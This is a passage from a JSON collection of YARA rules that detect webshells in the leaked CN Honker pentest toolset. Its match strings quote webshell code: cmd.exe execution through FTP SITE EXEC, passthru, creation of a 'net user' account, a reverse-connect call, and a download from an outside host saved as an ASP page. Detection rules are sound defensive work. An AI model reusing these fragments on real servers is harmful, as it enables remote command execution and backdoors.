filesize < 8KB and all of them\n}","date":"2015-06-23 13:08:51","description":"Webshell from CN Honker Pentest Toolset - file php3.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_PHP_php3_RID311E","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"229ab7524e2e13f82b54edb28ed3a053","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_Serv_U_by_Goldsun_RID3525 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file Serv-U_by_Goldsun.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 16:00:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"b.open \\\"GET\\\", \\\"http://127.0.0.1:\\\" & ftpport & \\\"/goldsun/upadmin/s2\\\", True,\" ascii\n      $s2 = \"newuser = \\\"-SETUSERSETUP\\\" & vbCrLf & \\\"-IP=0.0.0.0\\\" & vbCrLf & \\\"-PortNo=\\\" &\" ascii\n      $s3 = \"127.0.0.1:<%=port%>,\" fullword ascii\n      $s4 = \"GName=\\\"http://\\\" & request.servervariables(\\\"server_name\\\")&\\\":\\\"&request.serve\" ascii\n   condition: \n      filesize < 30KB and 2 of them\n}","date":"2015-06-23 16:00:41","description":"Webshell from CN Honker Pentest Toolset - file Serv-U_by_Goldsun.asp","minimum_yara":"1.7","name":"CN_Honker_Webshell_Serv_U_by_Goldsun_RID3525","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"4e52db4c36c7497495373be28f1ef815","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_PHP_php10_RID314C : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php10.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:16:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"dumpTable($N,$M,$Hc=false){if($_POST[\\\"format\\\"]!=\\\"sql\\\"){echo\\\"\\\\xef\\\\xbb\\\\xbf\" ascii\n      $s2 = \"';if(DB==\\\"\\\"||!$od){echo\\\"<a href='\\\".h(ME).\\\"sql='\\\".bold(isset($_GET[\\\"sql\\\"]\" ascii\n   condition: \n      filesize < 600KB and all of them\n}","date":"2015-06-23 13:16:31","description":"Webshell from CN Honker Pentest Toolset - file php10.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_PHP_php10_RID314C","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"08790a6dd5536d8193f408274f91aae2","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_Serv_U_servu_RID3344 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file servu.php\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 14:40:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"fputs ($conn_id, \\\"SITE EXEC \\\".$dir.\\\"cmd.exe /c \\\".$cmd.\\\"\\\\r\\\\n\\\");\" fullword ascii\n      $s1 = \"function ftpcmd($ftpport,$user,$password,$dir,$cmd){\" fullword ascii\n   condition: \n      filesize < 41KB and all of them\n}","date":"2015-06-23 14:40:31","description":"Webshell from CN Honker Pentest Toolset - file servu.php","minimum_yara":"1.7","name":"CN_Honker_Webshell_Serv_U_servu_RID3344","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"bf405239eb1bb547242c0232c9ddb08c","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_portRecall_jsp2_RID3452 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file jsp2.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:25:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"final String remoteIP =request.getParameter(\\\"remoteIP\\\");\" fullword ascii\n      $s4 = \"final String localIP = request.getParameter(\\\"localIP\\\");\" fullword ascii\n      $s20 = \"final String localPort = \\\"3390\\\";//request.getParameter(\\\"localPort\\\");\" fullword ascii\n   condition: \n      filesize < 23KB and all of them\n}","date":"2015-06-23 15:25:31","description":"Webshell from CN Honker Pentest Toolset - file jsp2.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_portRecall_jsp2_RID3452","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"a40caaa5e0215867a762e2839a810e07","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_ASPX_aspx2_RID31E5 : DEMO FILE T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file aspx2.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:42:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, FILE, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"if (password.Equals(this.txtPass.Text))\" fullword ascii\n      $s1 = \"<head runat=\\\"server\\\">\" fullword ascii\n      $s2 = \":<asp:TextBox runat=\\\"server\\\" ID=\\\"txtPass\\\" Width=\\\"400px\\\"></asp:TextBox>\" fullword ascii\n      $s3 = \"this.lblthispath.Text = Server.MapPath(Request.ServerVariables[\\\"PATH_INFO\\\"]);\" fullword ascii\n   condition: \n      uint16 ( 0 ) == 0x253c and filesize < 9KB and all of them\n}","date":"2015-06-23 13:42:01","description":"Webshell from CN Honker Pentest Toolset - file aspx2.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_ASPX_aspx2_RID31E5","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"aaf413b173a1ef71108c35a3afc55707","score":70,"tags":["T1100","DEMO","WEBSHELL","FILE"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_ASP_hy2006a_RID31A9 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file hy2006a.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:32:01\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s15 = \"Const myCmdDotExeFile = \\\"command.com\\\"\" fullword ascii\n      $s16 = \"If LCase(appName) = \\\"cmd.exe\\\" And appArgs <> \\\"\\\" Then\" fullword ascii\n   condition: \n      filesize < 406KB and all of them\n}","date":"2015-06-23 13:32:01","description":"Webshell from CN Honker Pentest Toolset - file hy2006a.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_ASP_hy2006a_RID31A9","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"c150317c32e43f7996e39ba58961fdc5","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_PHP_php1_RID311C : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php1.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:08:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s7 = \"$sendbuf = \\\"site exec \\\".$_POST[\\\"SUCommand\\\"].\\\"\\\\r\\\\n\\\";\" fullword ascii\n      $s8 = \"elseif(function_exists('passthru')){@ob_start();@passthru($cmd);$res = @ob_get_c\" ascii\n      $s18 = \"echo Exec_Run($perlpath.' /tmp/spider_bc '.$_POST['yourip'].' '.$_POST['yourport\" ascii\n   condition: \n      filesize < 621KB and all of them\n}","date":"2015-06-23 13:08:31","description":"Webshell from CN Honker Pentest Toolset - file php1.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_PHP_php1_RID311C","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"e6837a2376c2e42971ce188c33adfaf2","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_jspshell2_RID31F3 : DEMO T1007 T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file jspshell2.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:44:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1007, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s10 = \"if (cmd == null) cmd = \\\"cmd.exe /c set\\\";\" fullword ascii\n      $s11 = \"if (program == null) program = \\\"cmd.exe /c net start > \\\"+SHELL_DIR+\\\"/Log.txt\" ascii\n   condition: \n      filesize < 424KB and all of them\n}","date":"2015-06-23 13:44:21","description":"Webshell from CN Honker Pentest Toolset - file jspshell2.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_jspshell2_RID31F3","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"662840942d199064bcdd7a0cfe88c126","score":70,"tags":["T1100","DEMO","WEBSHELL","T1007"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_Tuoku_script_mysql_RID35FD : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file mysql.aspx\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 16:36:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"txtpassword.Attributes.Add(\\\"onkeydown\\\", \\\"SubmitKeyClick('btnLogin');\\\");\" fullword ascii\n      $s2 = \"connString = string.Format(\\\"Host = {0}; UserName = {1}; Password = {2}; Databas\" ascii\n   condition: \n      filesize < 202KB and all of them\n}","date":"2015-06-23 16:36:41","description":"Webshell from CN Honker Pentest Toolset - file mysql.aspx","minimum_yara":"1.7","name":"CN_Honker_Webshell_Tuoku_script_mysql_RID35FD","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"1ef12ac14ad1ceece57644df7872751b","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_PHP_php9_RID3124 : DEMO T1087 T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php9.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:09:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1087, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"Str[17] = \\\"select shell('c:\\\\windows\\\\system32\\\\cmd.exe /c net user b4che10r ab\" ascii\n   condition: \n      filesize < 1087KB and all of them\n}","date":"2015-06-23 13:09:51","description":"Webshell from CN Honker Pentest Toolset - file php9.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_PHP_php9_RID3124","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"075b5e6cae3cccbacaa810068cb3a280","score":70,"tags":["T1100","DEMO","WEBSHELL","T1087"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_portRecall_jsp_RID3420 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file jsp.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:17:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"lcx.jsp?localIP=202.91.246.59&localPort=88&remoteIP=218.232.111.187&remotePort=2\" ascii\n   condition: \n      filesize < 1KB and all of them\n}","date":"2015-06-23 15:17:11","description":"Webshell from CN Honker Pentest Toolset - file jsp.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_portRecall_jsp_RID3420","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"ae68cb8e0176a18f2e7dcd9c1af51dc6","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_ASPX_aspx3_RID31E6 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file aspx3.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:42:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"Process p1 = Process.Start(\\\"\\\\\\\"\\\" + txtRarPath.Value + \\\"\\\\\\\"\\\", \\\" a -y -k -m\" ascii\n      $s12 = \"if (_Debug) System.Console.WriteLine(\\\"\\\\ninserting filename into CDS:\" ascii\n   condition: \n      filesize < 100KB and all of them\n}","date":"2015-06-23 13:42:11","description":"Webshell from CN Honker Pentest Toolset - file aspx3.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_ASPX_aspx3_RID31E6","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"f5932323d5a2f114282b3ea74814217f","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_ASPX_shell_shell_RID3486 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file shell.aspx\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:34:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"<%try{ System.Reflection.Assembly.Load(Request.BinaryRead(int.Parse(Request.Cook\" ascii\n      $s1 = \"<%@ Page Language=\\\"C#\\\" ValidateRequest=\\\"false\\\" %>\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}","date":"2015-06-23 15:34:11","description":"Webshell from CN Honker Pentest Toolset - file shell.aspx","minimum_yara":"1.7","name":"CN_Honker_Webshell_ASPX_shell_shell_RID3486","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"94d4b00d75529500587278f7f2d10363","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell__php1_php7_php9_RID33F2 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - from files php1.txt, php7.txt, php9.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:09:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<a href=\\\"?s=h&o=wscript\\\">[WScript.shell]</a> \" fullword ascii\n      $s2 = \"document.getElementById('cmd').value = Str[i];\" fullword ascii\n      $s3 = \"Str[7] = \\\"copy c:\\\\\\\\\\\\\\\\1.php d:\\\\\\\\\\\\\\\\2.php\\\";\" fullword ascii\n   condition: \n      filesize < 300KB and all of them\n}","date":"2015-06-23 15:09:31","description":"Webshell from CN Honker Pentest Toolset - from files php1.txt, php7.txt, php9.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell__php1_php7_php9_RID33F2","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"81329e8036a09526e86b08954d85c7ac","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell__Serv_U_by_Goldsun_asp3_Serv_U_asp_RID3BB0 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - from files Serv-U_by_Goldsun.asp, asp3.txt, Serv-U asp.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 20:39:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"c.send loginuser & loginpass & mt & deldomain & quit\" fullword ascii\n      $s2 = \"loginpass = \\\"Pass \\\" & pass & vbCrLf\" fullword ascii\n      $s3 = \"b.send \\\"User go\\\" & vbCrLf & \\\"pass od\\\" & vbCrLf & \\\"site exec \\\" & cmd & vbCr\" ascii\n   condition: \n      filesize < 444KB and all of them\n}","date":"2015-06-23 20:39:51","description":"Webshell from CN Honker Pentest Toolset - from files Serv-U_by_Goldsun.asp, asp3.txt, Serv-U asp.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell__Serv_U_by_Goldsun_asp3_Serv_U_asp_RID3BB0","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"029026d1374edc7806c0cca7a4758b59","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell__asp4_asp4_MSSQL__MSSQL__RID36A6 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - from files asp4.txt, asp4.txt, MSSQL_.asp, MSSQL_.asp\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 17:04:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"\\\"<form name=\\\"\\\"searchfileform\\\"\\\" action=\\\"\\\"?action=searchfile\\\"\\\" method=\\\"\" ascii\n      $s1 = \"\\\"<TD ALIGN=\\\"\\\"Left\\\"\\\" colspan=\\\"\\\"5\\\"\\\">[\\\"& DbName & \\\"]\" fullword ascii\n      $s2 = \"Set Conn = Nothing \" fullword ascii\n   condition: \n      filesize < 341KB and all of them\n}","date":"2015-06-23 17:04:51","description":"Webshell from CN Honker Pentest Toolset - from files asp4.txt, asp4.txt, MSSQL_.asp, MSSQL_.asp","minimum_yara":"1.7","name":"CN_Honker_Webshell__asp4_asp4_MSSQL__MSSQL__RID36A6","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"3c83cc5c75d439f2ffa3fd7594a9e653","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell__Injection_jmCook_jmPost_ManualInjection_RID3E5C : DEMO HKTL T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - from files Injection.exe, jmCook.asp, jmPost.asp, ManualInjection.exe\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 22:33:51\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, HKTL, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"response.write  PostData(JMUrl,JmStr,JmCok,JmRef)\" fullword ascii\n      $s2 = \"strReturn=Replace(strReturn,chr(43),\\\"%2B\\\")  'JMDCW\" fullword ascii\n   condition: \n      filesize < 7342KB and all of them\n}","date":"2015-06-23 22:33:51","description":"Webshell from CN Honker Pentest Toolset - from files Injection.exe, jmCook.asp, jmPost.asp, ManualInjection.exe","minimum_yara":"1.7","name":"CN_Honker_Webshell__Injection_jmCook_jmPost_ManualInjection_RID3E5C","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"288816741449920a7f3b25af00c3bae1","score":70,"tags":["T1100","DEMO","WEBSHELL","HKTL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_cmfshell_RID31AA : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file cmfshell.cmf\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:32:11\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<cfexecute name=\\\"C:\\\\Winnt\\\\System32\\\\cmd.exe\\\"\" fullword ascii\n      $s2 = \"<form action=\\\"<cfoutput>#CGI.SCRIPT_NAME#</cfoutput>\\\" method=\\\"post\\\">\" fullword ascii\n   condition: \n      filesize < 4KB and all of them\n}","date":"2015-06-23 13:32:11","description":"Webshell from CN Honker Pentest Toolset - file cmfshell.cmf","minimum_yara":"1.7","name":"CN_Honker_Webshell_cmfshell_RID31AA","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"df2fd2279e055420ee226f0afba3ab2c","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_Linux_2_6_Exploit_RID34D6 : DEMO LINUX T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file 2.6.9\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:47:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, LINUX, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"[+] Failed to get root :( Something's wrong.  Maybe the kernel isn't vulnerable?\" fullword ascii\n   condition: \n      filesize < 56KB and all of them\n}","date":"2015-06-23 15:47:31","description":"Webshell from CN Honker Pentest Toolset - file 2.6.9","minimum_yara":"1.7","name":"CN_Honker_Webshell_Linux_2_6_Exploit_RID34D6","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"8379bc937b1c32e11dc8da041a5bda9d","score":70,"tags":["T1100","DEMO","LINUX","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_ASP_asp2_RID3115 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file asp2.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:07:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"<%=server.mappath(request.servervariables(\\\"script_name\\\"))%>\" fullword ascii\n      $s2 = \"webshell</font> <font color=#00FF00>\" fullword ascii\n      $s3 = \"Userpwd = \\\"admin\\\"   'User Password\" fullword ascii\n   condition: \n      filesize < 10KB and all of them\n}","date":"2015-06-23 13:07:21","description":"Webshell from CN Honker Pentest Toolset - file asp2.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_ASP_asp2_RID3115","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"f1720f106131e2a0842d3cec21b79e2b","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_FTP_MYSQL_MSSQL_SSH_RID3477 : DEMO T1021 T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file FTP MYSQL MSSQL SSH.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 15:31:41\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1021, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"$_SESSION['hostlist'] = $hostlist = $_POST['hostlist'];\" fullword ascii\n      $s2 = \"Codz by <a href=\\\"http://www.sablog.net/blog\\\">4ngel</a><br />\" fullword ascii\n      $s3 = \"if ($conn_id = @ftp_connect($host, $ftpport)) {\" fullword ascii\n      $s4 = \"$_SESSION['sshport'] = $mssqlport = $_POST['sshport'];\" fullword ascii\n      $s5 = \"<title>ScanPass(FTP/MYSQL/MSSQL/SSH) by 4ngel</title>\" fullword ascii\n   condition: \n      filesize < 20KB and 3 of them\n}","date":"2015-06-23 15:31:41","description":"Webshell from CN Honker Pentest Toolset - file FTP MYSQL MSSQL SSH.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_FTP_MYSQL_MSSQL_SSH_RID3477","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"45a467944b060919e29626dfdbe15634","score":70,"tags":["T1100","DEMO","WEBSHELL","T1021"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_ASP_shell_RID31B7 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file shell.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:34:21\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s1 = \"xPost.Open \\\"GET\\\",\\\"http://www.i0day.com/1.txt\\\",False //\" fullword ascii\n      $s2 = \"sGet.SaveToFile Server.MapPath(\\\"test.asp\\\"),2 //\" fullword ascii\n      $s3 = \"http://hi.baidu.com/xahacker/fuck.txt\" fullword ascii\n   condition: \n      filesize < 1KB and all of them\n}","date":"2015-06-23 13:34:21","description":"Webshell from CN Honker Pentest Toolset - file shell.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_ASP_shell_RID31B7","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"22d088360fcee75cd26f136ddf694dd3","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_PHP_php7_RID3122 : DEMO T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file php7.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 13:09:31\"\n      score = 70\n      customer = \"demo\"\n      license = \"CC-BY-NC https://creativecommons.org/licenses/by-nc/4.0/\"\n      tags = \"DEMO, T1100, WEBSHELL\"\n      minimum_yara = \"1.7\"\n      \n   strings:\n      $s0 = \"---> '.$ports[$i].'<br>'; ob_flush(); flush(); } } echo '</div>'; return true; }\" ascii\n      $s1 = \"$getfile = isset($_POST['downfile']) ? $_POST['downfile'] : ''; $getaction = iss\" ascii\n   condition: \n      filesize < 300KB and all of them\n}","date":"2015-06-23 13:09:31","description":"Webshell from CN Honker Pentest Toolset - file php7.txt","minimum_yara":"1.7","name":"CN_Honker_Webshell_PHP_php7_RID3122","reference":"Disclosed CN Honker Pentest Toolset","required_modules":[],"rule_hash":"9071ed4b38b2255ad4c85d471eee752e","score":70,"tags":["T1100","DEMO","WEBSHELL"]},{"author":"Florian Roth","content":"rule CN_Honker_Webshell_ASP_rootkit_RID32AB : DEMO T1014 T1087 T1100 WEBSHELL {\n   meta:\n      description = \"Webshell from CN Honker Pentest Toolset - file rootkit.txt\"\n      author = \"Florian Roth\"\n      reference = \"Disclosed CN Honker Pentest Toolset\"\n      date = \"2015-06-23 